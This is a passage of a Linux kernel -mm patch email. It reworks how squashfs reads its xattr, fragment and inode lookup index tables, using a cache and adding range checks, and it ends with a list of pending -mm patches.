+static inline int squashfs_check_range(u64 start_block, s32 size, struct squashfs_sb_info *msblk)
+{
+	if (size < 0)
+		return size;
+
+	if (start_block >= msblk->inode_table)
+		return -EIO;
+
+	/*
+	 * the above check ensured start_block is not 2^63 or larger, and so
+	 * this addition will not overflow
+	 */
+	if (start_block + squashfs_compressed_size_block(size) > msblk->inode_table)
+		return -EIO;
+
+	return size;
+}
+
+static inline s64 squashfs_add_indexes(u64 block, s64 blks, struct squashfs_sb_info *msblk)
+{
+
+	if (block > S64_MAX)
+		return -EIO;
+
+	/*
+	 * the above check ensured block is not 2^63 or larger, and so
+	 * this addition will not overflow
+	 */
+	if (block + blks > msblk->inode_table)
+		return -EIO;
+
+	return block + blks;
+}
+
+static inline bool squashfs_dir_space(struct inode *inode, loff_t length, int size)
+{
+	loff_t space = i_size_read(inode) - length;
+
+	return space >= size;
+}
+#endif
--- a/fs/squashfs/super.c~a
+++ a/fs/squashfs/super.c
@@ -33,6 +33,7 @@
 #include "squashfs_fs.h"
 #include "squashfs_fs_sb.h"
 #include "squashfs_fs_i.h"
+#include "squashfs_helpers.h"
 #include "squashfs.h"
 #include "decompressor.h"
 #include "xattr.h"
@@ -176,6 +177,29 @@ static const struct squashfs_decompresso
 	return decompressor;
 }
 
+static void squashfs_free_inode_table(struct squashfs_sb_info *msblk)
+{
+	if (msblk->lookup_table_is_cache)
+		squashfs_cache_delete(msblk->inode_lookup_cache);
+	else
+		kfree(msblk->inode_lookup_array);
+}
+
+static void squashfs_free_fragment_indexes(struct squashfs_sb_info *msblk)
+{
+	if (msblk->fragment_index_is_cache)
+		squashfs_cache_delete(msblk->fragment_index_cache);
+	else
+		kfree(msblk->fragment_index_array);
+}
+
+static void squashfs_free_xattr_indexes(struct squashfs_sb_info *msblk)
+{
+	if (msblk->xattr_id_is_cache)
+		squashfs_cache_delete(msblk->xattr_id_cache);
+	else
+		kfree(msblk->xattr_id_array);
+}
 
 static int squashfs_fill_super(struct super_block *sb, struct fs_context *fc)
 {
@@ -186,8 +210,9 @@ static int squashfs_fill_super(struct su
 	long long root_inode;
 	unsigned short flags;
 	unsigned int fragments;
-	u64 lookup_table_start, xattr_id_table_start, next_table;
-	int err, devblksize = sb_min_blocksize(sb, SQUASHFS_DEVBLK_SIZE);
+	u64 next_table;
+	s64 err;
+	int devblksize = sb_min_blocksize(sb, SQUASHFS_DEVBLK_SIZE);
 
 	TRACE("Entered squashfs_fill_superblock\n");
 
@@ -286,11 +311,12 @@ static int squashfs_fill_super(struct su
 
 	/* Check the root inode for sanity */
 	root_inode = le64_to_cpu(sblk->root_inode);
-	if (SQUASHFS_INODE_OFFSET(root_inode) > SQUASHFS_METADATA_SIZE)
+	if (squashfs_inode_offset(root_inode) > SQUASHFS_METADATA_SIZE)
 		goto insanity;
 
 	msblk->inode_table = le64_to_cpu(sblk->inode_table_start);
 	msblk->directory_table = le64_to_cpu(sblk->directory_table_start);
+	msblk->fragment_table = le64_to_cpu(sblk->fragment_table_start);
 	msblk->inodes = le32_to_cpu(sblk->inodes);
 	msblk->fragments = le32_to_cpu(sblk->fragments);
 	msblk->ids = le16_to_cpu(sblk->no_ids);
@@ -308,8 +334,7 @@ static int squashfs_fill_super(struct su
 	TRACE("Number of ids %d\n", msblk->ids);
 	TRACE("sblk->inode_table_start %llx\n", msblk->inode_table);
 	TRACE("sblk->directory_table_start %llx\n", msblk->directory_table);
-	TRACE("sblk->fragment_table_start %llx\n",
-		(u64) le64_to_cpu(sblk->fragment_table_start));
+	TRACE("sblk->fragment_table_start %llx\n", msblk->fragment_table);
 	TRACE("sblk->id_table_start %llx\n",
 		(u64) le64_to_cpu(sblk->id_table_start));
 
@@ -359,19 +384,17 @@ static int squashfs_fill_super(struct su
 
 	/* Handle xattrs */
 	sb->s_xattr = squashfs_xattr_handlers;
-	xattr_id_table_start = le64_to_cpu(sblk->xattr_id_table_start);
-	if (xattr_id_table_start == SQUASHFS_INVALID_BLK) {
+	msblk->xattr_id_table = le64_to_cpu(sblk->xattr_id_table_start);
+	if (msblk->xattr_id_table == SQUASHFS_INVALID_BLK) {
 		next_table = msblk->bytes_used;
 		goto allocate_id_index_table;
 	}
 
 	/* Allocate and read xattr id lookup table */
-	msblk->xattr_id_table = squashfs_read_xattr_id_table(sb,
-		xattr_id_table_start, &msblk->xattr_table, &msblk->xattr_ids);
-	if (IS_ERR(msblk->xattr_id_table)) {
+	err = squashfs_read_xattr_id_table(sb, msblk->xattr_id_table,
+				&msblk->xattr_table, &msblk->xattr_ids);
+	if (err < 0) {
 		errorf(fc, "unable to read xattr id index table");
-		err = PTR_ERR(msblk->xattr_id_table);
-		msblk->xattr_id_table = NULL;
 		if (err != -ENOTSUPP)
 			goto failed_mount;
 	}
@@ -390,20 +413,24 @@ allocate_id_index_table:
 	next_table = le64_to_cpu(msblk->id_table[0]);
 
 	/* Handle inode lookup table */
-	lookup_table_start = le64_to_cpu(sblk->lookup_table_start);
-	if (lookup_table_start == SQUASHFS_INVALID_BLK)
+	msblk->lookup_table = le64_to_cpu(sblk->lookup_table_start);
+	if (msblk->lookup_table == SQUASHFS_INVALID_BLK)
 		goto handle_fragments;
 
 	/* Allocate and read inode lookup table */
-	msblk->inode_lookup_table = squashfs_read_inode_lookup_table(sb,
-		lookup_table_start, next_table, msblk->inodes);
-	if (IS_ERR(msblk->inode_lookup_table)) {
+	err = squashfs_read_inode_lookup_table(sb, msblk->lookup_table,
+			next_table, msblk->inodes);
+	if (err < 0) {
+		errorf(fc, "unable to read inode lookup table");
+		goto failed_mount;
+	}
+
+	err = squashfs_inode_lookup_start(sb, 1);
+	if (err < 0) {
 		errorf(fc, "unable to read inode lookup table");
-		err = PTR_ERR(msblk->inode_lookup_table);
-		msblk->inode_lookup_table = NULL;
 		goto failed_mount;
 	}
-	next_table = le64_to_cpu(msblk->inode_lookup_table[0]);
+	next_table = msblk->lookup_table_start = err;
 
 	sb->s_export_op = &squashfs_export_ops;
 
@@ -420,15 +447,19 @@ handle_fragments:
 	}
 
 	/* Allocate and read fragment index table */
-	msblk->fragment_index = squashfs_read_fragment_index_table(sb,
-		le64_to_cpu(sblk->fragment_table_start), next_table, fragments);
-	if (IS_ERR(msblk->fragment_index)) {
+	err = squashfs_read_fragment_index_table(sb, msblk->fragment_table,
+			next_table, fragments);
+	if (err < 0) {
+		errorf(fc, "unable to read fragment index table");
+		goto failed_mount;
+	}
+
+	err = squashfs_frag_lookup_start(sb, 0);
+	if (err < 0) {
 		errorf(fc, "unable to read fragment index table");
-		err = PTR_ERR(msblk->fragment_index);
-		msblk->fragment_index = NULL;
 		goto failed_mount;
 	}
-	next_table = le64_to_cpu(msblk->fragment_index[0]);
+	next_table = msblk->fragment_table_start = err;
 
 check_directory_table:
 	/* Sanity check directory_table */
@@ -436,6 +467,7 @@ check_directory_table:
 		err = -EINVAL;
 		goto insanity;
 	}
+	msblk->directory_table_end = next_table;
 
 	/* Sanity check inode_table */
 	if (msblk->inode_table >= msblk->directory_table) {
@@ -478,10 +510,10 @@ failed_mount:
 	if (msblk->cache_mapping)
 		iput(msblk->cache_mapping->host);
 	msblk->thread_ops->destroy(msblk);
-	kfree(msblk->inode_lookup_table);
-	kfree(msblk->fragment_index);
+	squashfs_free_inode_table(msblk);
+	squashfs_free_fragment_indexes(msblk);
 	kfree(msblk->id_table);
-	kfree(msblk->xattr_id_table);
+	squashfs_free_xattr_indexes(msblk);
 	kfree(sb->s_fs_info);
 	sb->s_fs_info = NULL;
 	kfree(sblk);
@@ -599,10 +631,10 @@ static void squashfs_put_super(struct su
 			iput(sbi->cache_mapping->host);
 		sbi->thread_ops->destroy(sbi);
 		kfree(sbi->id_table);
-		kfree(sbi->fragment_index);
+		squashfs_free_fragment_indexes(sbi);
 		kfree(sbi->meta_index);
-		kfree(sbi->inode_lookup_table);
-		kfree(sbi->xattr_id_table);
+		squashfs_free_inode_table(sbi);
+		squashfs_free_xattr_indexes(sbi);
 		kfree(sb->s_fs_info);
 		sb->s_fs_info = NULL;
 	}
--- a/fs/squashfs/xattr.c~a
+++ a/fs/squashfs/xattr.c
@@ -19,6 +19,7 @@
 #include "squashfs_fs.h"
 #include "squashfs_fs_sb.h"
 #include "squashfs_fs_i.h"
+#include "squashfs_helpers.h"
 #include "squashfs.h"
 
 static const struct xattr_handler *squashfs_xattr_handler(int);
@@ -29,16 +30,22 @@ ssize_t squashfs_listxattr(struct dentry
 	struct inode *inode = d_inode(d);
 	struct super_block *sb = inode->i_sb;
 	struct squashfs_sb_info *msblk = sb->s_fs_info;
-	u64 start = SQUASHFS_XATTR_BLK(squashfs_i(inode)->xattr)
-						 + msblk->xattr_table;
-	int offset = SQUASHFS_XATTR_OFFSET(squashfs_i(inode)->xattr);
-	int count = squashfs_i(inode)->xattr_count;
+	u64 start;
+	int offset;
+	unsigned int count;
 	size_t rest = buffer_size;
 	int err;
 
-	/* check that the file system has xattrs */
-	if (msblk->xattr_id_table == NULL)
-		return -EOPNOTSUPP;
+	/* check that the file has xattrs */
+	if (squashfs_i(inode)->xattr == SQUASHFS_INVALID_BLK)
+		return 0;
+
+	count = squashfs_i(inode)->xattr_count;
+	if (count == 0 || count > squashfs_i(inode)->xattr_size)
+		return -EIO;
+
+	start = squashfs_xattr_blk(squashfs_i(inode)->xattr) + msblk->xattr_table;
+	offset = squashfs_xattr_offset(squashfs_i(inode)->xattr);
 
 	/* loop reading each xattr name */
 	while (count--) {
@@ -107,16 +114,27 @@ static int squashfs_xattr_get(struct ino
 {
 	struct super_block *sb = inode->i_sb;
 	struct squashfs_sb_info *msblk = sb->s_fs_info;
-	u64 start = SQUASHFS_XATTR_BLK(squashfs_i(inode)->xattr)
-						 + msblk->xattr_table;
-	int offset = SQUASHFS_XATTR_OFFSET(squashfs_i(inode)->xattr);
-	int count = squashfs_i(inode)->xattr_count;
+	u64 start;
+	int offset;
+	unsigned int count;
 	int name_len = strlen(name);
 	int err, vsize;
-	char *target = kmalloc(name_len, GFP_KERNEL);
+	char *target;
+
+	/* check that the file has xattrs */
+	if (squashfs_i(inode)->xattr == SQUASHFS_INVALID_BLK)
+		return -ENODATA;
+
+	count = squashfs_i(inode)->xattr_count;
+	if (count == 0 || count > squashfs_i(inode)->xattr_size)
+		return -EIO;
 
+	target = kmalloc(name_len, GFP_KERNEL);
 	if (target == NULL)
-		return  -ENOMEM;
+		return -ENOMEM;
+
+	start = squashfs_xattr_blk(squashfs_i(inode)->xattr) + msblk->xattr_table;
+	offset = squashfs_xattr_offset(squashfs_i(inode)->xattr);
 
 	/* loop reading each xattr name */
 	for (; count; count--) {
@@ -158,9 +176,9 @@ static int squashfs_xattr_get(struct ino
 				if (err < 0)
 					goto failed;
 				xattr = le64_to_cpu(xattr_val);
-				start = SQUASHFS_XATTR_BLK(xattr) +
+				start = squashfs_xattr_blk(xattr) +
 							msblk->xattr_table;
-				offset = SQUASHFS_XATTR_OFFSET(xattr);
+				offset = squashfs_xattr_offset(xattr);
 			}
 			/* read xattr value */
 			err = squashfs_read_metadata(sb, &val, &start, &offset,
@@ -169,6 +187,7 @@ static int squashfs_xattr_get(struct ino
 				goto failed;
 
 			vsize = le32_to_cpu(val.vsize);
+
 			if (buffer) {
 				if (vsize > buffer_size) {
 					err = -ERANGE;
--- a/fs/squashfs/xattr.h~a
+++ a/fs/squashfs/xattr.h
@@ -9,33 +9,40 @@
  */
 
 #ifdef CONFIG_SQUASHFS_XATTR
-extern __le64 *squashfs_read_xattr_id_table(struct super_block *, u64,
+extern int squashfs_read_xattr_id_table(struct super_block *, u64,
 		u64 *, unsigned int *);
-extern int squashfs_xattr_lookup(struct super_block *, unsigned int, int *,
-		unsigned int *, unsigned long long *);
+extern int squashfs_xattr_lookup(struct super_block *, unsigned int,
+		unsigned int *, unsigned int *, unsigned long long *);
+extern s64 squashfs_xattr_lookup_start(struct super_block *sb, u32 index);
 #else
-static inline __le64 *squashfs_read_xattr_id_table(struct super_block *sb,
+static inline int squashfs_read_xattr_id_table(struct super_block *sb,
 		u64 start, u64 *xattr_table_start, unsigned int *xattr_ids)
 {
 	struct squashfs_xattr_id_table *id_table;
 
 	id_table = squashfs_read_table(sb, start, sizeof(*id_table));
 	if (IS_ERR(id_table))
-		return (__le64 *) id_table;
+		return PTR_ERR(id_table);
 
 	*xattr_table_start = le64_to_cpu(id_table->xattr_table_start);
 	kfree(id_table);
 
 	ERROR("Xattrs in filesystem, these will be ignored\n");
-	return ERR_PTR(-ENOTSUPP);
+	return -ENOTSUPP;
 }
 
 static inline int squashfs_xattr_lookup(struct super_block *sb,
-		unsigned int index, int *count, unsigned int *size,
+		unsigned int index, unsigned int *count, unsigned int *size,
 		unsigned long long *xattr)
 {
 	return 0;
 }
+
+static inline s64 squashfs_xattr_lookup_start(struct super_block *sb, u32 index)
+{
+	return 0;
+}
+
 #define squashfs_listxattr NULL
 #define squashfs_xattr_handlers NULL
 #endif
--- a/fs/squashfs/xattr_id.c~a
+++ a/fs/squashfs/xattr_id.c
@@ -19,29 +19,70 @@
 
 #include "squashfs_fs.h"
 #include "squashfs_fs_sb.h"
+#include "squashfs_helpers.h"
 #include "squashfs.h"
 #include "xattr.h"
 
+s64 squashfs_xattr_lookup_start(struct super_block *sb, u32 index)
+{
+	struct squashfs_sb_info *msblk = sb->s_fs_info;
+	s64 start;
+
+	if (msblk->xattr_id_is_cache) {
+		s32 length = squashfs_xattr_blocks_bytes(msblk->xattr_ids);
+		s32 base = squashfs_xattr_blocks_base(index);
+		s32 offset = squashfs_xattr_blocks_offset(index);
+		s32 avail = min_t(int, length - base, PAGE_SIZE);
+		struct squashfs_cache_entry *entry;
+
+		start = squashfs_xattr_blocks_start(index, msblk);
+		if (start < 0)
+			return start;
+
+		entry = squashfs_cache_get(sb, msblk->xattr_id_cache, start,
+				avail | SQUASHFS_COMPRESSED_BIT_BLOCK);
+		if (entry->error < 0) {
+			int err = entry->error;
+
+			squashfs_cache_put(entry);
+			return err;
+		}
+
+		start = le64_to_cpu(((__le64 *)entry->data[0])[offset >> 3]);
+		squashfs_cache_put(entry);
+	} else {
+		s32 block = squashfs_xattr_block(index);
+
+		start = le64_to_cpu(msblk->xattr_id_array[block]);
+	}
+
+	if (start < msblk->xattr_id_table_start || start >= msblk->xattr_id_table)
+		return -EIO;
+
+	return start;
+}
+
 /*
  * Map xattr id using the xattr id look up table
  */
 int squashfs_xattr_lookup(struct super_block *sb, unsigned int index,
-		int *count, unsigned int *size, unsigned long long *xattr)
+		unsigned int *count, unsigned int *size,
+		unsigned long long *xattr)
 {
 	struct squashfs_sb_info *msblk = sb->s_fs_info;
-	int block = SQUASHFS_XATTR_BLOCK(index);
-	int offset = SQUASHFS_XATTR_BLOCK_OFFSET(index);
-	u64 start_block;
+	s32 offset = squashfs_xattr_block_offset(index);
+	s64 start;
 	struct squashfs_xattr_id id;
 	int err;
 
 	if (index >= msblk->xattr_ids)
 		return -EINVAL;
 
-	start_block = le64_to_cpu(msblk->xattr_id_table[block]);
+	start = squashfs_xattr_lookup_start(sb, index);
+	if (start < 0)
+		return start;
 
-	err = squashfs_read_metadata(sb, &id, &start_block, &offset,
-							sizeof(id));
+	err = squashfs_read_metadata(sb, &id, &start, &offset, sizeof(id));
 	if (err < 0)
 		return err;
 
@@ -55,19 +96,19 @@ int squashfs_xattr_lookup(struct super_b
 /*
  * Read uncompressed xattr id lookup table indexes from disk into memory
  */
-__le64 *squashfs_read_xattr_id_table(struct super_block *sb, u64 table_start,
+int squashfs_read_xattr_id_table(struct super_block *sb, u64 table_start,
 		u64 *xattr_table_start, unsigned int *xattr_ids)
 {
 	struct squashfs_sb_info *msblk = sb->s_fs_info;
-	unsigned int len, indexes;
+	s32 len;
 	struct squashfs_xattr_id_table *id_table;
-	__le64 *table;
 	u64 start, end;
-	int n;
+	s64 res;
 
+	/* Untrusted table_start will be validated by squashfs_read_data() */
 	id_table = squashfs_read_table(sb, table_start, sizeof(*id_table));
 	if (IS_ERR(id_table))
-		return (__le64 *) id_table;
+		return PTR_ERR(id_table);
 
 	*xattr_table_start = le64_to_cpu(id_table->xattr_table_start);
 	*xattr_ids = le32_to_cpu(id_table->xattr_ids);
@@ -77,10 +118,9 @@ __le64 *squashfs_read_xattr_id_table(str
 
 	/* there is always at least one xattr id */
 	if (*xattr_ids == 0)
-		return ERR_PTR(-EINVAL);
+		return -EINVAL;
 
-	len = SQUASHFS_XATTR_BLOCK_BYTES(*xattr_ids);
-	indexes = SQUASHFS_XATTR_BLOCKS(*xattr_ids);
+	len = squashfs_xattr_blocks_bytes(*xattr_ids);
 
 	/*
 	 * The computed size of the index table (len bytes) should exactly
@@ -90,43 +130,78 @@ __le64 *squashfs_read_xattr_id_table(str
 	end = msblk->bytes_used;
 
 	if (len != (end - start))
-		return ERR_PTR(-EINVAL);
+		return -EINVAL;
 
-	table = squashfs_read_table(sb, start, len);
-	if (IS_ERR(table))
-		return table;
-
-	/* table[0], table[1], ... table[indexes - 1] store the locations
-	 * of the compressed xattr id blocks.  Each entry should be less than
-	 * the next (i.e. table[0] < table[1]), and the difference between them
-	 * should be SQUASHFS_METADATA_SIZE or less.  table[indexes - 1]
-	 * should be less than table_start, and again the difference
-	 * shouls be SQUASHFS_METADATA_SIZE or less.
-	 *
-	 * Finally xattr_table_start should be less than table[0].
-	 */
-	for (n = 0; n < (indexes - 1); n++) {
-		start = le64_to_cpu(table[n]);
-		end = le64_to_cpu(table[n + 1]);
-
-		if (start >= end || (end - start) >
-				(SQUASHFS_METADATA_SIZE + SQUASHFS_BLOCK_OFFSET)) {
-			kfree(table);
-			return ERR_PTR(-EINVAL);
+	if (len <= (PAGE_SIZE * 4)) {
+		/* Read fragment indexes into memory */
+		s32 n, indexes = squashfs_xattr_blocks(*xattr_ids);
+		__le64 *array = squashfs_read_table(sb, start, len);
+
+		if (IS_ERR(array))
+			return PTR_ERR(array);
+
+		/* array[0], array[1], ... array[indexes - 1] store the locations
+		 * of the compressed xattr id blocks.  Each entry should be less than
+		 * the next (i.e. array[0] < array[1]), and the difference between them
+		 * should be SQUASHFS_METADATA_SIZE or less.  array[indexes - 1]
+		 * should be less than array_start, and again the difference
+		 * shouls be SQUASHFS_METADATA_SIZE or less.
+		 *
+		 * Finally xattr_array_start should be less than array[0].
+		 */
+		for (n = 0; n < (indexes - 1); n++) {
+			start = le64_to_cpu(array[n]);
+			end = le64_to_cpu(array[n + 1]);
+
+			if (start >= end || (end - start) >
+					(SQUASHFS_METADATA_SIZE + SQUASHFS_BLOCK_OFFSET)) {
+				kfree(array);
+				return -EINVAL;
+			}
 		}
-	}
 
-	start = le64_to_cpu(table[indexes - 1]);
-	if (start >= table_start || (table_start - start) >
-				(SQUASHFS_METADATA_SIZE + SQUASHFS_BLOCK_OFFSET)) {
-		kfree(table);
-		return ERR_PTR(-EINVAL);
-	}
+		start = le64_to_cpu(array[indexes - 1]);
+		if (start >= table_start || (table_start - start) >
+					(SQUASHFS_METADATA_SIZE + SQUASHFS_BLOCK_OFFSET)) {
+			kfree(array);
+			return -EINVAL;
+		}
 
-	if (*xattr_table_start >= le64_to_cpu(table[0])) {
-		kfree(table);
-		return ERR_PTR(-EINVAL);
+		msblk->xattr_id_table_start = le64_to_cpu(array[0]);
+		if (*xattr_table_start >= msblk->xattr_id_table_start) {
+			kfree(array);
+			return -EINVAL;
+		}
+
+		msblk->xattr_id_array = array;
+		msblk->xattr_id_is_cache = false;
+	} else {
+		/* Use a cache to store the last 16Kbytes of indexes read */
+		struct squashfs_cache *cache = squashfs_cache_init("xattr index", 4, PAGE_SIZE);
+
+		if (IS_ERR(cache))
+			return PTR_ERR(cache);
+
+		msblk->xattr_id_cache = cache;
+		msblk->xattr_id_is_cache = true;
+		msblk->xattr_id_table_start = 0;
+
+		res = squashfs_xattr_lookup_start(sb, 0);
+		if (res < 0)
+			goto corrupted;
+
+		if (*xattr_table_start >= res) {
+			res = -EINVAL;
+			goto corrupted;
+		}
+
+		msblk->xattr_id_table_start = res;
 	}
 
-	return table;
+	return 0;
+
+corrupted:
+	squashfs_cache_delete(msblk->xattr_id_cache);
+	msblk->xattr_id_cache = NULL;
+	return res;
 }
_

Patches currently in -mm which might be from akpm@linux-foundation.org are

mm-vma-drop-mm-asynchronously-in-vma_start_read-fix.patch
mm-vma-drop-mm-asynchronously-in-vma_start_read-fix-2.patch
kselftest-mm-rename-read_pmd_pagesize-to-pmd_psize-fix.patch
selftests-mm-check-madv_cold-and-madv_pageout-on-partly-advised-thps-fix.patch
alloc_tag-introduce-ioctls-to-toggle-allocation-tracepoints-fix-fix.patch
alloc_tag-introduce-ioctls-to-toggle-allocation-tracepoints-fix.patch
selftests-mm-add-uffdio_move-huge-zeropage-pmd-regression-test-fix.patch
selftests-mm-allocate-nr_pages-based-on-pmd-size-for-uffd-pmd_move-tests-fix.patch
selftests-mm-retain-move-pmd-coverage-and-verify-huge-pmds.patch
lib-test_xarray-check-unused-spare-node-after-range-creation.patch
mm-memory-failure-dont-unpoison-a-leaked-raw_hwp_unreliable-folio-fix.patch
mm-vmstat_kunit-add-synthetic-benchmark-for-mm-stats-fix.patch
lib-test_hmm-invalidate-all-mirrors-on-device-private-migration.patch
lib-test_hmm-invalidate-all-mirrors-on-device-private-migration-fix.patch
mm-prevent-pre-content-bypass-through-mremap-and-remap_file_pages.patch
afs-do-not-put-error-pointer-after-address-lookup-failure.patch
selftests-mm-check-that-fsync-reports-hard-poisoned-dirty-page-cache.patch
selftests-mm-check-that-fsync-reports-hard-poisoned-dirty-page-cache-fix-0.patch
selftests-mm-check-that-fsync-reports-hard-poisoned-dirty-page-cache-fix-1.patch
selftests-mm-check-that-fsync-reports-hard-poisoned-dirty-page-cache-fix-2.patch
selftests-mm-check-that-fsync-reports-hard-poisoned-dirty-page-cache-fix-3.patch
selftests-mm-check-that-fsync-reports-hard-poisoned-dirty-page-cache-fix-4.patch
selftests-mm-check-that-fsync-reports-hard-poisoned-dirty-page-cache-fix-5.patch
selftests-mm-check-that-fsync-reports-hard-poisoned-dirty-page-cache-fix-6.patch
selftests-mm-check-that-fsync-reports-hard-poisoned-dirty-page-cache-fix-7.patch
ocfs2-unregister-the-jbd2-shrinker-before-journal-shutdown.patch
ipc-msg-clamp-negative-msg_info-usage-counts.patch
squashfs-fix-leaked-page-locks-when-page-actor-allocation-fails-fix.patch
a.patch
b.patch
ocfs2-skip-network-flush-when-no-domain-handlers-are-registered.patch
selftests-ptrace-check-that-ptrace_set_syscall_info-rejects-invalid-error-values-fix.patch
lib-asn1_encoder-fix-encoding-of-zero-oid-components.patch
proc-serialize-task-owner-updates.patch
proc-dont-lock-task-inodes-whose-owner-has-not-changed.patch
drivers-media-v4l2-core-v4l2-vp9c-reduce-inlining.patch

